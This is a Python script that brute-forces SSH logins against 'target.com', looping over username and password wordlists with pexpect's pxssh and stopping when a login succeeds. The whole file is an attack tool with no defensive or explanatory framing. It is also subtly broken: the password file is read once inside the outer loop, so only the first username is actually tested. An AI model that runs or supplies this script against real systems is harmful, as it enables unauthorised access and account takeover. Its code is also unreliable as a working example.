from pexpect import pxssh
import sys
server = pxssh.pxssh()
def bruteForcer(target, user, _pass):
    print("Checking: %s/%s" % (user, _pass))
    try:
        if server.login(target, user, _pass):
            print("Credentials Found: %s/%s" % (user, _pass))
            sys.exit(0)
        else:
            pass
    except:
        pass
username_dict = '/root/Desktop/usernames.txt'
password_dict = '/root/Desktop/passwords.txt'
if __name__ == '__main__':
    user_names = open(username_dict)
    pass_words = open(password_dict)
    for user in user_names.read().splitlines():
        for _pass in pass_words.read().splitlines():
            bruteForcer('target.com', user.rstrip('\n'), _pass.rstrip('\n'))